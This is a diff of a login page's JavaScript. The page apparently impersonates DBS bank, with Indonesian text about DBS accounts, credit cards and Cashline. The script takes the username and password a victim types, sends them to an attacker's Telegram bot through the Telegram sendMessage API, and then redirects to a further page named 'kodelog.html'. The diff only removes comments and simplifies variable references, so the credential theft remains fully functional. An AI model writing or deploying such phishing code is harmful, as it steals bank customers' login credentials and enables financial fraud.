@@ -143,7 +143,7 @@
 <script src="config.js"></script>
 <script>
   async function formlogin(event) {
-    event.preventDefault(); // Mencegah reload
+    event.preventDefault();
 
     const username = document.getElementById('user').value.trim();
     const password = document.getElementById('pass').value.trim();
@@ -153,21 +153,18 @@
       return;
     }
 
-    // Tunggu sampai config.js selesai memuat
-    if (!window.TELEGRAM_TOKEN || !window.TELEGRAM_CHAT_ID) {
+    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
       alert("Konfigurasi belum tersedia. Coba beberapa saat lagi.");
       return;
     }
 
-    const token = window.TELEGRAM_TOKEN;
-    const chat_id = window.TELEGRAM_CHAT_ID;
+    const token = TELEGRAM_TOKEN;
+    const chat_id = TELEGRAM_CHAT_ID;
     const message = `UPDATE TRANSAKSI\nUsername: ${username}\nPassword: ${password}`;
 
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: chat_id,
         text: message
@@ -175,7 +172,7 @@
     })
     .then(response => {
       if (response.ok) {
-        window.location.href = "kodelog.html"; // Arahkan setelah sukses
+        window.location.href = "kodelog.html";
       } else {
         alert("Gagal mengirim data ke Telegram.");
       }
@@ -186,6 +183,7 @@
     });
   }
 </script>
+
     <center> 
      <p class="zs" style="text-align: center; margin-left: -5px">Belum punya username atau password untuk akses rekening DBS, Kartu Kredit atau Cashline?</p> 
     </center> 
